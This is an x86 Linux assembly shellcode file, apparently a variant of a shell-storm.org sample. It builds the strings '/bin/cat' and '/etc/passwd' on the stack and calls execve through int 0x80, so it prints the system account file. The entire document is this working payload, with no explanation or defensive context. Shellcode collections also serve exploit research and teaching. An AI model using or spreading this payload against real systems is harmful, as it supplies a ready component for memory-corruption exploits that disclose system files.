;http://shell-storm.org/shellcode/files/shellcode-571.php
global _start
section .text
_start:

	xor edx,edx ; cbq
	push edx
	mov dword[esp-0x4], 0x7461632f ;push dword 0x7461632f
	mov dword[esp-0x8], 0x6e69622f ;push dword 0x6e69622f
	sub esp,0x8
	mov ebx,esp
	push edx
	mov dword[esp-0x4], 0x64777373 ;push dword 0x64777373
	mov dword[esp-0x8], 0x61702f2f ;push dword 0x61702f2f
	mov dword[esp-0xb], 0x6374652f ;push dword 0x6374652f
	sub esp,0xb
	mov ecx,esp
	xor eax,eax
	mov al,0xb
	push edx
	push ecx
	push ebx
	mov ecx,esp
	int 80h
